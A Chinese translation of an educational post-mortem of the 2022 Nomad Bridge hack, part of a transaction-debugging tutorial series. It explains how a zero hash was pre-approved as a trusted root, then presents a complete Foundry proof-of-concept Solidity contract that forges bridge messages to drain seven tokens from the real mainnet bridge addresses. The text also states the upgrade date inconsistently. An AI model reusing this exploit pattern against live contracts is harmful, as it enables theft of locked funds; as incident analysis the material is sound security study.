# OnChain Transaction Debugging: 7. Nomad Bridge 跨鏈橋事件分析 (2022/08)

作者：[gmhacker.eth](https://twitter.com/realgmhacker)

翻譯： [Spark](https://twitter.com/SparkToday00)

## 事件概览（Introduction）
  2022年8月1日，Nomad Bridge 遭到黑客攻击。1.9亿美元的锁定资产在此次事件中被盗。在第一名黑客成功攻击之后，引来里许多来自黑暗森林的旅客的模仿攻击，最终导致了一个严重的，攻击源众多的安全事件。
  
  根本原因是在Nomad的一个代理合约的例行升级中，将零哈希值标记为可信根，这使得任意消息都可以自动得到证明。黑客利用这个漏洞来欺骗桥合约，并解锁资金。第一个[攻击交易](https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460) 从桥合约获利100 WBTC，约合230万美元。
  
  此次攻击中，攻击者无需进行闪电贷款或与其他DeFi协议进行其他复杂的交互。攻击的过程仅仅调用了合约上的一个函数，并以正确的消息输入进而向协议的流动性发动攻击。攻击交易的简单和可重放性导致其他人也收集了部分非法利润让整个事件变得更糟。
  
  正如[Rekt News](https://rekt.news/nomad-rekt/)提到的，“诚如DeFi的游戏规则，这次黑客攻击几乎是无门槛的，任何人都可以加入进来。”

## 背景知识（Background）
Nomad是一个跨链交互应用，允许在以太坊、Moonbeam和其他链之间进行代币操作。发送到Nomad合约的消息经过验证后，通过离线代理机制传输到其他链上，遵循乐观验证（optimistic verification）机制。

正如大多数跨链桥接协议一样，Nomad的代币跨链是通过在一侧锁定代币，另一侧铸造代币，以完成在不同的链上转移价值。因为这些代表代币最终可以被烧毁以解锁原始资金（即跨链回到代币的原生链），它们起到借据的作用，具有与原始ERC-20代币相同的经济价值。正因如此，跨链项目在复杂的智能合约内积累了大量资金，使得黑客们垂涎三尺。

![](https://miro.medium.com/v2/resize:fit:1400/0*-reF-Ys6qVUWwnfJ)
跨链代币锁定与铸造流程，参考：[MakerDAO 博客](https://blog.makerdao.com/what-are-blockchain-bridges-and-why-are-they-important-for-defi/)

在Nomad项目中，利用叫做**Replica**的合约验证Merkle树结构中的消息， 这个合约在各个链上都有部署。项目中的其他合约都依靠这个合约验证输入的消息。一旦消息被验证，它就会被存储在Merkle树中，并生成一个新的承诺树根，并在随后确认、处理。

## 根本原因（Root Cause）
在Nomad桥有了大致了解之后，我们可以深入到实际的智能合约代码中，探索导致2022年8月黑客攻击的根本原因。要做到这一点，我们需要详细了解**Replica**合约。

*Replica.sol 中 `process` 函数[代码片段](https://gist.github.com/gists-immunefi/f8ef00be9e1c5dd4d879a418966191e0/raw/8fb8fd808b59eca9ca51df98aef65d7ce4c805e6/Nomad%20Hack%20Analysis%201.sol)*

```solidity=
function process(bytes memory _message) public returns (bool _success) {
    // ensure message was meant for this domain
    bytes29 _m = _message.ref(0);
    require(_m.destination() == localDomain, "!destination");
    // ensure message has been proven
    bytes32 _messageHash = _m.keccak();
    require(acceptableRoot(messages[_messageHash]), "!proven");
    // check re-entrancy guard
    require(entered == 1, "!reentrant");
    entered = 0;
    // update message status as processed
    messages[_messageHash] = LEGACY_STATUS_PROCESSED;
    // call handle function
    IMessageRecipient(_m.recipientAddress()).handle(
        _m.origin(),
        _m.nonce(),
        _m.sender(),
        _m.body().clone()
    );
    // emit process results
    emit Process(_messageHash, true, "");
    // reset re-entrancy guard
    entered = 1;
    // return true
    return true;
}
```


Replica合约中的`process`函数负责将消息发送到最终接收方。只有当输入消息被验证的情况下函数才会成功执行，这意味着传入的消息在调用`process`之前已经被添加到Merkle树中，并拥有了可被接受和可信赖的根（root）。这个验证（第36行）利用`acceptableRoot` view 函数在已验证根的映射（`mapping`）中查询传入消息的哈希值从而判断消息是否合法。

*Replica.sol 中 `initialize` 函数[代码片段](https://gist.github.com/gists-immunefi/4792c4bb10d3f73648b4b0f86e564ac9/raw/1f70cc5490bf2383d42eeec3fa06a74d7be1a66c/Nomad%20Hack%20Analysis%202.sol)*
```solidity=
function initialize(
    uint32 _remoteDomain,
    address _updater,
    bytes32 _committedRoot,
    uint256 _optimisticSeconds
) public initializer {
    __NomadBase_initialize(_updater);
    // set storage variables
    entered = 1;
    remoteDomain = _remoteDomain;
    committedRoot = _committedRoot;
    // pre-approve the committed root.
    confirmAt[_committedRoot] = 1;
    _setOptimisticTimeout(_optimisticSeconds);
}
```



当升级代理合约的实现合约时，实现合约会执行一次性的初始化函数，该函数将设置一些初始状态值。可以看到，在[6月21日Nomad部署新的实现合约](https://etherscan.io/tx/0xaf05a8c0b2d8c9e795329ab6e05044d016ee9a355d6eb49b082ce0789363f715)，并且在之后[调用initialize函数](https://etherscan.io/tx/0x53fd92771d2084a9bf39a6477015ef53b7f116c79d98a21be723d06d79024cad)初始化实现合约，最后对存储实现合约地址的合约进行[例行升级](https://etherscan.io/tx/0x7bccd64f4c4d5f6f545c2edf904857e6ddb460532fc0ac7eb5ac175cd21e56b1)，在调用initialize函数初始化合约时，0x00被设置为预批准的根，被存储在`confirmAt`映射中，这也是本次事件的开端。

回到`process`函数，我们可以看到，验证过程依赖于检查消息映射上的消息哈希值，并将该消息标记为已处理，这样攻击者就不能重复使用同一消息。

值得一提的是，在EVM智能合约存储中，所有位置（`slot`）初始值为0，也就是说当我们读取一个未使用的存储位置时EVM总会返回零值（0x00）而非异常。同理对于映射（`mapping`）, 当查询不存在的消息哈希值时就会返回零值，这个值将被传给`acceptableRoot`函数，由于在4月21日的升级中0x00被设置成了可信的根，该函数就会返回true。接着这个消息被标记为已处理，但是任何人都可以通过简单更改消息内容产生新的消息并进行模仿攻击。

输入的消息往往根据各种不同的参数类型进行编码。对于从桥上解锁资金的消息，其中之一便是收件人地址。因此，在第一个攻击者执行了一个[成功的交易后](https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460)，任何了解解码消息的人都可以简单地更改收件人地址并进行重复攻击交易，因为是使用不同的消息，所以新的攻击不会受到先前攻击的影响从而让新地址获利。

## 攻击复现（Proof of Concept）
现在我们理解了为什么Nomad会被攻击，是时候尝试复现本次攻击了。我们将根据不同的代币去创建相应的攻击消息（message），然后通过 `Replica`合约中的`process`函数盗取相应资产。

在这里我们选用带有存档功能的RPC服务， 例如[Ankr的免费服务](https://www.ankr.com/rpc/eth/)，拷贝15259100 block时的状态（攻击发生前一个block）。

我们的复现攻击将根据以下步骤：
1. 选择一个给定的ERC-20代币，并检查Nomad ERC-20桥梁合约的余额。
2. 生成一个带有正确参数的消息来解锁资金，并将攻击者地址作为接收者，全额代币余额作为要解锁的资金量。
3. 调用`process`函数以获取代币。
4. 针对不同代币重复以上步骤盗取资金。

余下的篇幅，我们将使用Foundry分步完成攻击复现.

## 攻击（The Attack）

*[初始的攻击合约](https://gist.githubusercontent.com/gists-immunefi/4305df38623ddcaa11812a9c186c73ac/raw/e960b16512343fb3d6f3d8821486e7fb1452952c/Nomad%20Hack%20Analysis%203.sol)*
```solidity
pragma solidity ^0.8.13;
 
import "@openzeppelin/token/ERC20/ERC20.sol";
 
interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}
 
contract Attacker {
   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
 
   // tokens
   address [] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];
 
   function attack() external {
       for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = IERC20(token).balanceOf(ERC20_BRIDGE);
 
           bytes memory payload = genPayload(msg.sender, token, amount_bridge);
           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");
       }
   }
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory) {}
}
```

攻击合约的入口是`attack`函数， 它包含一个简单的循环来循环查询代币桥地址（ERC20_BRIDGE）的不同代币余额。`ERC20_BRIDGE`指代Nomad ERC20 桥合约，也就是所有锁定资产的存放地址。

在这之后我们根据余额来创建用来攻击的消息，并作为输入传给`IReplica(REPLICA).process`函数。这个函数将会把我们伪造的信息传递给相应的后端合约，进而触发解锁和转移资产的请求，最终将桥玩弄于鼓掌之间。

*产生符合条件的消息*
```solidity=
contract Attacker {
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
  
   // Nomad domain IDs
   uint32 constant ETHEREUM = 0x657468;   // "eth"
   uint32 constant MOONBEAM = 0x6265616d; // "beam"
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),            // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),        // Recipient of the transfer
           uint256(amount),                    // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(                 
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}
```

在生成消息的工程中要注意不同参数的编码以确保Nomad的协议可以正确解码。值得一提的是我们需要制定消息的转发路径-桥路由合约和ERC20桥地址。同时我们需要用`0x3`作为类型来表示代币转移。

最后，我们要确定可以带给我们利润的参数-代币地址，转移金额和接收者。正如我们之前所提到的，这将创建对于`Replica`合约全新的信息。

不可思议的是，就算加上一些和Foundry相关的日志信息，整个PoC的代码也只有87行。通过运行以上复现代码，我们可以获得以下资金：

- 1,028 WBTC
- 22,876 WETH
- 87,459,362 USDC
- 8,625,217 USDT
- 4,533,633 DAI
- 119,088 FXS
- 113,403,733 CQT

## 总结（Conclusion）

Nomad Bridge攻击可以说是2022年最大的黑客攻击之一。这次攻击再次向我们强调了协议安全的重要性。在这个特殊的案例中，我们已经了解到一个常规的合约升级是如何产生一个可怕的漏洞并危及所有锁定的资金。此外，在开发过程中，人们需要注意存储槽（slot）的默认值为0，特别是在涉及映射（mapping）的逻辑中。对于这种可能导致漏洞的常见值，z最好设置一些单元测试以避免潜在的危险。

值得一提的是，一些参与模仿攻击的账户将资金返还给了Nomad项目，项目方也在计划[重新上线](https://medium.com/nomad-xyz-blog/nomad-bridge-relaunch-guide-3a4ef6624f90)并将资产返还给受到影响的用户。如果您持有Nomad在攻击中丢失的资产，请将它返还给[Nomad recovery 钱包](https://etherscan.io/address/0x94a84433101a10aeda762968f6995c574d1bf154)。

正如之前提到的，这次攻击远比看起来更加简单，而且很有可能在一个交易里盗取所有资金，以下是完整的PoC代码（包括一些Foundry日志）：

*[完整的PoC代码](https://gist.githubusercontent.com/gists-immunefi/2bdffe6f9683c9b3ab810e1fb7fe4aff/raw/df16e8103c6c3b38d412e0320cda37da9a5a9e7c/Nomad%20Hack%20Analysis%205.sol)*
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
 
import "@openzeppelin/token/ERC20/ERC20.sol";
import "forge-std/console.sol";
 
interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}
 
contract Attacker {
   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
  
   // Nomad domain IDs
   uint32 constant ETHEREUM = 0x657468;   // "eth"
   uint32 constant MOONBEAM = 0x6265616d; // "beam"
 
   // tokens
   address [] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];
 
   function attack() external {
       for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = ERC20(token).balanceOf(ERC20_BRIDGE);
 
           console.log(
               "[*] Stealing",
               amount_bridge / 10**ERC20(token).decimals(),
               ERC20(token).symbol()
           );
           console.log(
               "    Attacker balance before:",
               ERC20(token).balanceOf(msg.sender)
           );
 
           // Generate the payload with all of the tokens stored on the bridge
           bytes memory payload = genPayload(msg.sender, token, amount_bridge);
 
           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");
 
           console.log(
               "    Attacker balance after: ",
               IERC20(token).balanceOf(msg.sender) / 10**ERC20(token).decimals()
           );
       }
   }
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),          // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),      // Recipient of the transfer
           uint256(amount),                  // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(                 
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}
```
